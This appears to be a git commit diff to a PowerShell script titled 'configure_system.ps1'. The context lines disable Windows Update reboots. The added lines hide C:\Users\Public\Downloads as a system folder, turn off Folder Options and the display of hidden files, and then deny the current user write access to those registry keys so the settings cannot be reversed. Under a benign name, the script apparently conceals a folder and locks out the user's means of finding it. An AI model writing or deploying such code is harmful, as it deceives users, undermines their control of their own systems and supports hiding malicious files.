f3c76846ccb15585ef8443aff213d2bed2999d01
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-06-04 19:42:33 +0700

    configure_system.ps1

--- configure_system.ps1
+++ configure_system.ps1
@@ -62,4 +62,24 @@ Stop-Service -Name UsoSvc -Force
 schtasks /Change /TN "\Microsoft\Windows\UpdateOrchestrator\Reboot" /DISABLE
 schtasks /Query /TN "\Microsoft\Windows\UpdateOrchestrator\Reboot"
 Clear-RecycleBin -Force
+attrib +h +s "C:\Users\Public\Downloads"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
+-Name "NoFolderOptions" -PropertyType DWORD -Value 1 -Force
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
+-Name "Hidden" -PropertyType DWORD -Value 2 -Force
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
+-Name "Hidden" -Value 2
+Stop-Process -Name explorer -Force
+# Khóa quyền chỉnh sửa key 'Explorer\Advanced'
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+$acl = Get-Acl $regPath
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)", "SetValue", "Deny")
+$acl.AddAccessRule($rule)
+Set-Acl $regPath $acl
+# Khóa key 'Policies\Explorer'
+$regPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+$acl2 = Get-Acl $regPath2
+$rule2 = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)", "SetValue", "Deny")
+$acl2.AddAccessRule($rule2)
+Set-Acl $regPath2 $acl2
 exit
